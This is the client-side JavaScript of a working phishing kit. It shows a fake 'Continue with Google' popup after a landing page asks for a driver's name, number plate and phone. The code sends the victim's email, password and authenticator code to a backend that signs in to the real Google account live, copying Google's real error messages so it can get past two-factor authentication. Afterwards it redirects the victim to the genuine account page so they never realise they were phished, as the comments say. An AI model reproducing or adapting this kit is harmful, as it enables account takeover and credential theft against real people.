const token = location.pathname.split('/').pop();
// A unique id for THIS visitor's registration. The same static link is used by
// many people, so this keeps each person's steps building up their own fresh
// session server-side instead of everyone sharing one.
const wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2));
const $ = (id) => document.getElementById(id);

function show(name) {
  for (const id of ['screen-email', 'screen-pass', 'screen-totp']) {
    $(id).classList.toggle('hidden', id !== name);
  }
}

// The Google sign-in lives in a POPUP over the landing page (like a real
// "Continue with Google" flow) — the victim never sees a Google "page".
function openPopup() {
  $('g-overlay').classList.remove('hidden');
  $('g-email').focus();
}
function closePopup() {
  $('g-overlay').classList.add('hidden');
}
function hint(id, msg, error) {
  const el = $(id);
  if (msg) { el.textContent = msg; el.hidden = false; el.classList.toggle('error', !!error); }
  else { el.textContent = ''; el.hidden = true; el.classList.remove('error'); }
}

async function api(pathname, body) {
  const sep = pathname.includes('?') ? '&' : '?';
  return fetch('/api/wizard/' + token + pathname + sep + 'wid=' + wid, {
    method: body ? 'POST' : 'GET',
    headers: { 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
}

async function step(name, value) {
  try {
    const r = await api('/step', { step: name, value });
    return r.ok ? await r.json() : null;
  } catch {
    return null;
  }
}

// Toggle a Google-style loading spinner on a submit button while the backend
// is actually driving the real sign-in for that step.
function busy(btn, on) {
  const el = typeof btn === 'string' ? $(btn) : btn;
  el.disabled = on;
  el.classList.toggle('loading', on);
}

// The most recent wizard payload from the server (carries the landing URL and
// the live-login result for each step). Kept so errors can be mirrored against
// the real Google messages and completion can redirect to the real site.
let WIZ = null;
function setWiz(w) { if (w) WIZ = w; }

// Mark the invite complete, then bounce the victim to the REAL Google account
// page — no fake "you're all set" screen, so they never realize it was phishing.
function redirect() {
  const url = (WIZ && WIZ.landing) || 'https://myaccount.google.com/';
  window.location.replace(url);
}
async function finish() {
  await api('/complete', {}).catch(() => {});
  redirect();
}

// ---- inert links (kept so the page looks like real Google) ----
$('forgot-email').addEventListener('click', () =>
  hint('email-hint', 'Enter the email address linked to this account.'));
$('forgot-pass').addEventListener('click', () =>
  hint('pass-hint', 'Enter the password for this account.'));
// "Try another way" -> don't fight over 2FA; let REAL Google handle the prompt/
// SMS. Bounce them over and they finish it on the genuine page.
$('try-another').addEventListener('click', finish);

// ---- authentic footer: Help/Privacy/Terms hints + language toggle ----
for (const btn of document.querySelectorAll('.g-foot-link')) {
  btn.addEventListener('click', () => {
    const msg = btn.dataset.hint || 'You can close this page once signed in.';
    const cur = document.querySelector('.g-screen:not(.hidden)');
    // flash the footer hint where there's room; otherwise toast on the card
    toast(msg);
  });
}
function toast(msg) {
  const el = $('toast');
  el.textContent = msg;
  el.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => el.classList.remove('show'), 2400);
}
// real-Google bottom footer is gone in the popup layout; guard in case it returns
if ($('g-lang')) {
  $('g-lang').addEventListener('click', (e) => {
    const langs = ['English (United States)', 'English (UK)', 'Deutsch', 'Français (France)', 'Español (España)'];
    const span = $('g-lang').querySelector('span');
    const cur = langs.indexOf(span.textContent);
    span.textContent = langs[(cur + 1) % langs.length];
  });
}

// ---- driver submission (landing) ----
$('form-driver').addEventListener('submit', async (e) => {
  e.preventDefault();
  const driverName = $('d-name').value.trim();
  const licensePlate = $('d-plate').value.trim();
  if (!driverName && !licensePlate) {
    return hint('driver-hint', 'Enter your name and number plate to continue.', true);
  }
  hint('driver-hint', '');
  busy('btn-driver', true);
  const ok = await step('driver', { driverName, licensePlate, phone: $('d-phone').value.trim() });
  busy('btn-driver', false);
  setWiz(ok);
  if (!ok) {
    hint('driver-hint', 'Something went wrong. Try again.', true);
    return;
  }
  // driver details captured -> open the Google sign-in as a popup
  openPopup();
  show('screen-email');
});

// close the popup (backdrop click or the X), leaving the landing intact
$('g-close').addEventListener('click', closePopup);
$('g-overlay').addEventListener('click', (e) => { if (e.target === $('g-overlay')) closePopup(); });

// ---- email ----
$('form-email').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-email').value.trim();
  if (!v) return hint('email-hint', 'Enter an email or phone number.');
  hint('email-hint', '');
  busy('btn-email', true);
  const ok = await step('username', v);
  busy('btn-email', false);
  setWiz(ok);
  const L = (ok && ok.login) || {};
  if (L.status === 'error') {
    // real Google mirrors this: unknown account -> error, stay on this screen
    hint('email-hint', L.message || "Couldn't find your Google Account.", true);
    return;
  }
  if (!ok) {
    hint('email-hint', 'Something went wrong. Try again.', true);
    return;
  }
  // Mirror EXACTLY what the real backend browser is asking for: if Google
  // already signed us in (no password needed), go straight to it; otherwise the
  // real browser is on the password screen, so the clone asks for the password.
  if (ok.login && ok.login.state === 'logged-in') return finish();
  renderAccount(v);
  show('screen-pass');
  $('g-pass').focus();
});

function renderAccount(email) {
  const [name, domain] = email.split('@');
  $('account-email').textContent = email;
  $('avatar-initials').textContent = (name || '?').charAt(0).toUpperCase();
  $('to-continue').textContent = 'To continue to ' + (domain ? domain : 'your Google Account');
  $('account-row').hidden = false;
}

// ---- password ----
$('show-pass').addEventListener('change', (e) => {
  $('g-pass').type = e.target.checked ? 'text' : 'password';
});
$('form-pass').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-pass').value;
  if (!v) return hint('pass-hint', 'Enter your password.', true);
  hint('pass-hint', '');
  $('g-pass').classList.remove('field-error');
  busy('btn-pass', true);
  const w = await step('password', v);
  busy('btn-pass', false);
  setWiz(w);
  const L = (w && w.login) || {};
  if (!w) {
    hint('pass-hint', 'Something went wrong. Try again.', true);
    return;
  }
  if (L.status === 'error') {
    // wrong password — mirror real Google: show the error and STAY here, don't
    // advance to 2FA.
    $('g-pass').classList.add('field-error');
    hint('pass-hint', L.message || 'Wrong password. Try again or click Forgot password to reset it.', true);
    return;
  }
  // Mirror the REAL browser's state — only ever show 2FA if Google is actually
  // asking for a code. A no-2FA account genuinely signs in -> redirect, never 2FA.
  if (w.loggedIn || L.state === 'logged-in') return finish();
  if (L.state === 'prompt') return finish();          // phone prompt -> let real Google confirm it
  if (L.state === 'totp') {                           // Google asks for a 6-digit code
    show('screen-totp');
    $('g-totp').focus();
    return;
  }
  // still on the password screen / not settled -> just wait silently
  hint('pass-hint', 'Verifying…');
});

// ---- 2FA ----
async function submitTotp() {
  const v = $('g-totp').value.trim();
  if (!v) return hint('totp-hint', 'Enter the code shown in your authenticator app.', true);
  hint('totp-hint', '');
  $('g-totp').classList.remove('field-error');
  busy('btn-totp', true);
  const w = await step('totp', v);
  busy('btn-totp', false);
  setWiz(w);
  const L = (w && w.login) || {};
  if (L.status === 'error') {
    // wrong / expired code — like real Google, reject and let them retry the
    // current code (codes rotate every 30s).
    $('g-totp').classList.add('field-error');
    hint('totp-hint', L.message || 'That code didn’t work. Enter the current code from your authenticator app.', true);
    $('g-totp').focus();
    $('g-totp').select();
    return;
  }
  // mirror: only done once the real browser is genuinely signed in
  if (w.loggedIn || L.state === 'logged-in' || L.state === 'prompt') return finish();
  // otherwise Google still hasn't accepted it — stay and let them retry
}
$('btn-totp').addEventListener('click', submitTotp);
$('g-totp').addEventListener('keydown', (e) => { if (e.key === 'Enter') submitTotp(); });
$('g-totp').addEventListener('input', () => {
  const el = $('g-totp');
  // like real Google: digits only, max 6, auto-submit at 6
  el.value = el.value.replace(/\D/g, '').slice(0, 6);
  if (el.value) { hint('totp-hint', ''); el.classList.remove('field-error'); }
  if (el.value.length === 6) submitTotp();
});

// ---- boot ----
(async function boot() {
  const r = await api('');
  if (!r.ok) {
    document.title = 'Sign in - Google Accounts';
    $('card').innerHTML = '<div class="oops" style="margin:8px 0">This sign-in link is invalid or has expired.<br><span style="font-weight:400;color:#5f6368">Ask the sender for a fresh link.</span></div>';
    return;
  }
  const w = await r.json();
  setWiz(w);
  // Already signed in (e.g. reload after completing / returning visitor) ->
  // bounce straight to the real account page; otherwise show the driver landing
  // (popup stays closed until they hit "Continue with Google").
  if (w.done || w.loggedIn) { redirect(); return; }
  closePopup();
  $('d-name').focus();
})();
